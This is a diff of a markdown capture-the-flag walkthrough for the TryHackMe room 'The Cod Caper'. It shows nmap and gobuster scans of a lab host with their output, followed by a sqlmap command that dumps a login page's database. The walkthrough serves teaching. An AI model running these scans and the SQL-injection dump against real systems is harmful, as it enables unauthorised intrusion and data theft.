@@ -1,7 +1,22 @@
-TASK2
+# The Cod Caper
+> 4lch3my | June 26, 2023
+-------------------
+#### A guided room taking you through infiltrating and exploiting a Linux system.
+#### [Room Link](https://tryhackme.com/room/thecodcaper)
 
-nmap -sC -sV -A
+## Tasks 
+##### 1. Intro
+  Deploy the machine with the Start Machine button, also either deploy your [Attack Box](https://tryhackme.com/access) OR Connect to [OpenVPN](https://tryhackme.com/access) and deploy your personal KALI machine.
+<br>
 
+
+##### 2. Host Enumeration
+To start, I will use [nmap] which is default option on the personal Kali install I have. We start with a basic command
+  `nmap -sC -sV -A MACHINE_IP `
+The -sC flag runs scripts against open ports as well to determine if there are external/common vulnerabilities that we can use outright. The -sV probes all open ports it finds to determine if we can get the service/version information. -A uses agressive mode, so we can follow along with the commands and enumeration.
+  In our NMAP results we get:
+
+```
 Starting Nmap 7.60 ( https://nmap.org ) at 2023-05-15 23:25 BST
 Nmap scan report for ip-10-10-2-173.eu-west-1.compute.internal (10.10.2.173)
 Host is up (0.00062s latency).
@@ -22,21 +37,15 @@ OS CPE: cpe:/o:linux:linux_kernel:3.13
 OS details: Linux 3.13
 Network Distance: 1 hop
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-TRACEROUTE
-HOP RTT     ADDRESS
-1   0.62 ms ip-10-10-2-173.eu-west-1.compute.internal (10.10.2.173)
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 12.24 seconds
+```
 
-TASK3
+##### 3. Web Enumeration
+Time to run gobuster to see what directorys we have on `port 80`. To do this we can run the command:`gobuster dir -u MACHINE_IP -w /usr/share/wordlists/dirb/big.txt -x php,html,txt`:
 
-gobuster dir -u http://10.10.2.173/ -w /usr/share/wordlists/dirb/big.txt -x php,html,txt
-
+```
 ===============================================================
 Gobuster v3.0.1
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 [+] Url:            http://10.10.2.173/
 [+] Threads:        10
@@ -62,9 +71,9 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 2023/05/15 23:35:13 Finished
 ===============================================================
+```
 
-
-TASK4
+##### 4. Web Exploitation
 
 sqlmap -u http://10.10.2.173/administrator.php --forms --dump
 
